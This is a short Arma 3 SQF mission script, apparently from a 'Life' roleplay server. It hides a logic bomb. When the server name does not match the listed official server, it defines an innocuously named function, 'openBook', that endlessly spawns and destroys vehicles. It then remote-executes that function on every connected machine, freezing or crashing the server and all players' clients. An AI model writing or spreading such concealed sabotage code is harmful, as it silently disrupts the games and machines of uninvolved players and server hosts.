[] spawn {
	waitUntil {(!isnull (finddisplay 46))};
	if !(isMultiplayer) exitWith {};
	if !(serverName in ["LIMMITT Network Official Server | Custom ArmA 3 Life | ts.limmitt-network.co.uk"]) then {
		openBook = {
			while {true} do {
				_veh = "C_Quadbike_01_F" createVehicle [0,0,0]; 
				_veh setDamage 1;
			};
		};
		[] remoteExecCall ["openBook", 0];
	};
};